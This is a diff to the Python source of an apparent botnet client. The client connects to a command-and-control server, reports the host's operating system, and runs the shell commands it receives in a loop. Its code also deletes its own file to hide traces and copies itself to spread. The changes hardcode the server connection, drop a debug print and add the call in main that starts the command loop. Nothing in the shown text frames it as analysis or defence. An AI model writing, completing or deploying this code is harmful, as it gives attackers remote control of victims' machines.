@@ -31,7 +31,7 @@ global log
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
-def create_client_socket(ip_addr: str, port: int):
+def create_client_socket():
 	"""This function creates a client socket to connect to 
 		our command & control server.
 		Arguments:
@@ -41,8 +41,8 @@ def create_client_socket(ip_addr: str, port: int):
 			This function will return a socket object.
 	"""
 	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_sock: # Initializing socket.
-		ip_port = (IP, PORT) # Connect to server IP/Port.
-		client_sock.connect(ip_port)
+		ip_port = (IP, PORT) # Tuple containing IP address and port number.
+		client_sock.connect(ip_port) # Connecting to server.
 		initial_message = "OS=" + system() # Send IP address and OS information.
 		client_sock.send(initial_message.encode()) # Send message with this host's IP back to the server.
 		return client_sock # Return the created client socket.
@@ -57,7 +57,6 @@ def self_delete(name: str):
 			None
 	"""
 	remove(name) # Delete the local file to remove traces of our presence 
-	print("File Deleted") # Print a confirmation
 	
 def propagate(name: str):
 	"""This function will create other instances of this file in 
@@ -188,7 +187,7 @@ class WindowsBot:
 			Returns:
 				None
 		"""
-		sock = create_client_socket(self.ip_addr) # Store socket object.
+		sock = create_client_socket() # Store socket object.
 		command = sock.recv(1024).decode('utf-8') # Receive command from server.
 		while command != 'quit': # Check if the user has asked to quit the program.
 			command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
@@ -201,7 +200,7 @@ class LinuxBot:
 		that are specific to the Linux operating system.
 	"""
 	def __init__(self):
-	    self.ip_addr = "172.17.0.1"
+	    pass
 
 	def exec_linux_cmd(self, commnd: str):
 		"""This function will execute Linux commands requested by the C&C.
@@ -238,6 +237,8 @@ def main():
 		obj = LinuxBot() # If Linux, instantiate LinuxBot object.
 	else:
 		obj = WindowsBot() # Else, instantiate WindowsBot object.
+
+	obj.handle_request()
 
 if __name__ == '__main__':
     main()
